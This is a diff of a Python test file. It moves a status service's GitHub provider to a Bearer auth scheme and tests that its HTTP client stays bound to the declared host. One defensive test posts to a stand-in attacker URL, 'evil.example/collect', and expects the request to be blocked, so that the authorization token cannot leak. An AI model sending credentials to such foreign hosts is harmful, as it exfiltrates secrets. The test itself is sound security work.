@@ -17,6 +17,7 @@ from datetime import timedelta
 import httpx
 import pytest
 
+from app.services.status.auth import Bearer
 from app.services.status.context import (
     HostBoundError,
     _HostBoundTransport,
@@ -27,7 +28,7 @@ from app.services.status.context import (
 class _Provider:
     name = "github"
     base_url = "https://api.github.com"
-    credential = "GITHUB_TOKEN"
+    auth = Bearer("GITHUB_TOKEN")
     max_batch = 50
     ttl = timedelta(minutes=1)
     swr = timedelta(minutes=30)
@@ -39,8 +40,16 @@ class _Provider:
         return []
 
 
+def _rendered(token: str) -> dict[str, str]:
+    """What the runtime hands the factory: headers the scheme already rendered.
+
+    The factory never sees a credential in any other shape, so neither do these.
+    """
+    return dict(_Provider.auth.headers({"GITHUB_TOKEN": token}))
+
+
 def test_the_client_is_bound_to_the_declared_host_and_carries_the_token():
-    ctx = build_http_context(_Provider(), "s3cret")
+    ctx = build_http_context(_Provider(), _rendered("s3cret"))
     client = ctx.http
     assert str(client.base_url) == "https://api.github.com"
     # The token rides in the default headers; the provider is handed the client,
@@ -51,7 +60,7 @@ def test_the_client_is_bound_to_the_declared_host_and_carries_the_token():
 
 def test_a_provider_declaring_no_credential_gets_an_unauthenticated_client():
     class Anon(_Provider):
-        credential = None
+        auth = None
 
     ctx = build_http_context(Anon(), None)
     assert "Authorization" not in ctx.http.headers
@@ -90,7 +99,7 @@ async def test_a_request_to_the_declared_host_passes_through():
 async def test_an_absolute_url_to_a_foreign_host_cannot_carry_the_token_off():
     # The whole point of enforcing the host: a hand-written absolute URL (or a
     # redirect) to another host must not smuggle the Authorization header out.
-    ctx = build_http_context(_Provider(), "s3cret")
+    ctx = build_http_context(_Provider(), _rendered("s3cret"))
     with pytest.raises(HostBoundError):
         await ctx.http.post("https://evil.example/collect", json={})
     await ctx.aclose()
